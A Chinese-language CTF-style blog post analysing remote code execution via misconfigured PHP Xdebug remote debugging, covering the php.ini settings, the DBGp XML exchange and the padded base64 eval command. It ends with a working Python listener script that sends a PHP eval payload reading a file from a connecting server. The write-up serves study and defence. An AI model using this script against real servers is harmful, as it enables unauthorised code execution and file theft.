---
title: PHP Xdebug 远程调试命令执行分析
layout: post
category: [CTF]
tagline: 
show_reward: true
tags: [CTF, PHP, Xdebug]
---

[Xdebug](https://xdebug.org/) 是 PHP 的调试工具，为 PHP 脚本与调试器客户端提供了一个接口，使用 [DBGp](https://xdebug.org/docs-dbgp.php) 协议进行交互，使用的是 XML 格式的数据。在调试的时候，可以通过调试器在服务器上执行任意代码。通过 `phpinfo()` 可以查看 WebServer 上是否有开启 Xdebug，由于 Xdebug 支持远程调试，如果服务器上配置不当，可能引起远程任意命令执行。

![xdebug.jpg](/uploads/post_img/2017/09/xdebug.jpg "")

Xdebug 在 `php.ini` 中进行配置，比较关键参数有几项：

```ini
; 启用远程调试
xdebug.remote_enable=1
; 如果开启此项配置，将忽略 xdebug.remote_host 的参数
; 浏览器访问任意 php 页面时，服务器会以当前客户端 IP 作为 remote_host
xdebug.remote_connect_back=1
; 绑定远程调试主机地址
xdebug.remote_host=localhost
; 远程主机监听的端口
xdebug.remote_port=9000
```

PHP 允许动态识别是否启动调试，当访问任意 PHP 页面时，如果浏览器的 GET，POST，COOKIE 中包含 XDEBUG_SESSION_START 参数，且 php 开启了 xdebug 模块，则会与 remote_host 的调试端口通过 TCP 协议建立会话进行 debug 信息的交互。

## 数据流程

### 固定 IP 地址

xdebug.remote_connect_back=0 的情况，这也是 Xdebug 的默认方式。

![xdebug_1.jpg](/uploads/post_img/2017/09/xdebug_1.jpg "")

### 动态 IP 地址

xdebug.remote_connect_back=1 的情况

![xdebug_2.jpg](/uploads/post_img/2017/09/xdebug_2.jpg "")

## 实例分析

Chrome 中有一个 [Xdebug](https://chrome.google.com/webstore/detail/xdebug/nhodjblplijafdpjjfhhanfmchplpfgl?hl=en-GB&gl=GB) 插件，可以进行远程调试，[Github 地址](https://github.com/artbek/chrome-xdebug-client)。在Xdebug 插件中开启监听，访问服务端的任意 PHP 页面，带上 XDEBUG_SESSION_START 参数

```
http://192.168.1.10:8080/test.php?XDEBUG_SESSION_START=1
```

![xdebug_chrome.jpg](/uploads/post_img/2017/09/xdebug_chrome.jpg "")

Xdebug 插件可以接收到调试会话，然后可以在上面执行任意命令。通过抓包分析可以发现，调试会话的消息是通过 XML 进行交互，会话建立的时候，服务端会发送：

```xml
490.<?xml version="1.0" encoding="iso-8859-1"?>
<init xmlns="urn:debugger_protocol_v1" xmlns:xdebug="http://xdebug.org/dbgp/xdebug" fileuri="file:///D:/PHP/PHPStudy/WWW/phpinfo.php" language="PHP" xdebug:language_version="5.4.45" protocol_version="1.0" appid="4288" idekey="1"><engine version="2.4.1"><![CDATA[Xdebug]]></engine><author><![CDATA[Derick Rethans]]></author><url><![CDATA[http://xdebug.org]]></url><copyright><![CDATA[Copyright (c) 2002-2016 by Derick Rethans]]></copyright></init>.
```

当在 xdebug 中执行 PHP 代码时，例如

```
print_r(file_get_contents('D:/1.txt'), true)
```

会发送这种格式的数据给 WebServer，`-i 63` 是会话编号，可以取任意的数字，后面是 php 代码的 base64，最后的 . 是 `\x00`。而且发送的数据包内容必须是 304 的倍数，多余的部分以 `\x00` 填充。

```
eval -i 63 -- cHJpbnRfcihmaWxlX2dldF9jb250ZW50cygnRDovMS50eHQnKSwgdHJ1ZSk=............................................................................
```

当服务端接收到调试器发送的命令后，会执行其中的 PHP 代码，并返回执行结果，这个过程会返回很多个 response，其中第一个 response 就是 PHP 代码的执行结果，同样是以 base64 编码。

```xml
260.<?xml version="1.0" encoding="iso-8859-1"?>
<response xmlns="urn:debugger_protocol_v1" xmlns:xdebug="http://xdebug.org/dbgp/xdebug" command="eval" transaction_id="63"><property type="string" size="4" encoding="base64"><![CDATA[dGVzdA==]]></property></response>
```

分析了 Xdebug 调试的交互过程，可以写出一个脚本来执行任意命令。如果是在公网上的 PHP 网站，需要有一个公网 IP 才能实现远程调试，如果只有 Linux 的公网服务器可用，可以使用这个脚本来模拟这个过程。

```py
# encoding: utf-8

from socketserver import BaseRequestHandler, TCPServer
from base64 import b64encode

php_code = b"print_r(file_get_contents('D:/1.txt'), true)"
payload = b"""eval -i 105 -- %s""" % b64encode(php_code)
# 总长度是304的倍数
if len(payload) % 304 != 0:
    payload = payload + b'\x00' * (304 - len(payload) % 304)

count = 0
class EchoHandler(BaseRequestHandler):
    def handle(self):
        global count
        print('Got connection from', self.client_address)
        while True:
            msg = self.request.recv(8192)
            print(msg)
            if not msg:
                break
            if count == 0:
                self.request.send(payload)

            count += 1

if __name__ == '__main__':
    serv = TCPServer(('', 9000), EchoHandler)
    serv.serve_forever()
```

## 参考资料

- https://paper.seebug.org/308/
- https://weizhimiao.github.io/2016/10/22/Xdebug之远程调试/

